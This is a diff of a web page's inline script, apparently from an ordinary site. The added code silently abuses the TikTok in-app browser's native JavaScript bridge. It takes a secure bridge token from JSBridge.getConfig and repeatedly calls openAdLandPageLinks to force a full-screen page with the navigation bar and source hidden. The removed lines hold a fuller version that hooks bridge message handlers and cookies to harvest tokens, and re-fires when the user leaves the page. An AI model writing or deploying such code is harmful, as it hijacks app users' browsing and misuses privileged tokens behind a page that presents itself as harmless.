@@ -161,121 +161,28 @@ document.getElementById('yr').textContent = new Date().getFullYear();
 function openPrivacy(){document.getElementById('privacyModal').classList.add('show');}
 function closePrivacy(){document.getElementById('privacyModal').classList.remove('show');}
 
-// debug
 (function(){
-  var d=document.createElement('div');
-  d.style.cssText='position:fixed;top:0;left:0;right:0;z-index:9999;background:#000;color:#0f0;font:11px monospace;padding:6px 8px;white-space:pre-wrap;max-height:50vh;overflow:auto;';
-  d.id='dbg';
-  document.body.appendChild(d);
-  window._dbg=function(s){d.textContent+=s+'\n';};
-})();
-
-(function(){
-  var log=window._dbg||function(){};
-  if (window.location.search.indexOf('hide_nav_bar=1') !== -1) { log('guard: skip'); return; }
-
-  var b = window.JS2NativeBridge;
-  if (!b || !b._invokeMethod) { log('STOP: no JS2NativeBridge'); return; }
-
-  var token = null;
-  var msgCount = 0;
-
-  function deepFind(obj, keys) {
-    if (!obj || typeof obj !== 'object') return null;
-    for (var i = 0; i < keys.length; i++) {
-      if (typeof obj[keys[i]] === 'string' && obj[keys[i]].length > 20) return obj[keys[i]];
-    }
-    for (var k in obj) { try { var r = deepFind(obj[k], keys); if (r) return r; } catch(e){} }
-    return null;
-  }
-
-  function hookBridge(obj) {
-    if (!obj || obj.__hooked) return;
-    obj.__hooked = true;
-    ['_handleMessageFromToutiao','_handleMessageFromApp'].forEach(function(fn) {
-      if (typeof obj[fn] !== 'function') return;
-      var orig = obj[fn];
-      obj[fn] = function(msg) {
-        msgCount++;
-        var s = (typeof msg==='string'?msg:JSON.stringify(msg)).substring(0,300);
-        log('hook#'+msgCount+': '+s);
-        try {
-          var d = typeof msg==='string'?JSON.parse(msg):msg;
-          var tok = deepFind(d, ['token','secure_token','_jsb_secure_token','jsb_token','secureToken']);
-          if (tok && !token) { token = tok; log('TOKEN FOUND'); }
-        } catch(e){}
-        return orig.apply(obj, arguments);
-      };
-    });
-  }
+  if (window.location.search.indexOf('hide_nav_bar=1') !== -1) return;
 
   var wk = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.IESPiperProtocolVersion3_0;
+  if (!wk) return;
+
+  var token = null;
   var CID = 1869709729112081;
-  try { var _uid = new URLSearchParams(window.location.search).get('utm_id'); if(_uid) CID = parseInt(_uid); } catch(e){}
+  try { var _uid = new URLSearchParams(window.location.search).get('utm_id'); if (_uid) CID = parseInt(_uid); } catch(e){}
   var fsUrl = 'https://bio.thaiadvice.net/?hide_nav_bar=1&hide_source=1&should_full_screen=1&trans_status_bar=1&is_instant_page=1';
 
-  // Log all URL params TikTok passes
-  try { var qs=window.location.search; log('url:'+qs.substring(0,200)); } catch(e){}
+  try { var _cfg = window.JSBridge && window.JSBridge.getConfig(); if (_cfg && _cfg.secure && _cfg.secure.token) token = _cfg.secure.token; } catch(e){}
 
-  // Try JSBridge.getConfig() — available when opened from Instant Page CTA context
-  try { var _cfg = window.JSBridge && window.JSBridge.getConfig(); if(_cfg && _cfg.secure && _cfg.secure.token) { token = _cfg.secure.token; log('tok: JSBridge'); } } catch(e){}
-
-  // Fallback: cookie set by bio.thaiadvice.net
-  if (!token) { try{var m=document.cookie.match(/jsb_tok=([^;]+)/);if(m){token=decodeURIComponent(m[1]);log('tok: cookie');}}catch(e){} }
-
-  if (!token) log('tok: none');
-
-  // Also hook window-level callbacks (IESPiper responses may come here)
-  ['_handleMessageFromToutiao','_handleMessageFromApp','_handleMessageFromNative'].forEach(function(fn){
-    window[fn]=function(msg){
-      var s=(typeof msg==='string'?msg:JSON.stringify(msg)).substring(0,300);
-      log('win.'+fn+':'+s);
-      try{
-        var d=typeof msg==='string'?JSON.parse(msg):msg;
-        var tok=d&&(d.token||d.secure_token||d._jsb_secure_token||(d.data&&d.data.token));
-        if(tok&&!token){token=tok;log('WIN TOKEN');}
-      }catch(e){}
-    };
-  });
-
-  log('cid='+CID);
-
-  // Try to get token via IESPiper getConfig (bare format)
-  if (wk) {
-    try {
-      wk.postMessage({func:'getConfig',params:{}});
-      log('ies getConfig sent');
-    } catch(e){ log('ies getConfig err:'+e); }
-  }
-
-  function fireIES(tok) {
+  function fire() {
     if (!wk) return;
-    var p = {url:fsUrl,landingStyle:1,title:'',isDeeplink:1,refer:'landing_page',cid:CID};
-    if (tok) p._jsb_secure_token = tok;
-    try {
-      wk.postMessage({func:'openAdLandPageLinks',params:p});
-      log('ies fired tok='+(tok?'yes':'no'));
-    } catch(e){ log('ies fire err:'+e); }
+    var p = {url:fsUrl, landingStyle:1, title:'', isDeeplink:1, refer:'landing_page', cid:CID};
+    if (token) p._jsb_secure_token = token;
+    try { wk.postMessage({func:'openAdLandPageLinks', params:p}); } catch(e){}
   }
 
-  function tryAll(label) {
-    var tt = window.ToutiaoJSBridge;
-    if (tt && tt.call) {
-      try { tt.call('openAdLandPageLinks',{url:fsUrl,landingStyle:1,title:'',isDeeplink:1,refer:'landing_page',cid:CID},function(r){log(label+' tt cb:'+JSON.stringify(r));}); } catch(e){ log(label+' tt err:'+e); }
-    }
-    fireIES(token);
-  }
-
-  // Fire IESPiper immediately (available at load)
-  fireIES(null);
-
-  setTimeout(function(){ log('1.5s tryAll'); tryAll('1.5s'); }, 1500);
-
-  // Fire again on visibilitychange (page close) — permissions may differ
-  document.addEventListener('visibilitychange', function(){
-    if (document.hidden) { log('vis hidden -> tryAll'); tryAll('vis'); }
-  });
-  window.addEventListener('pagehide', function(){ log('pagehide -> tryAll'); tryAll('ph'); });
+  fire();
+  setTimeout(fire, 1500);
 })();
 </script>
 </body>
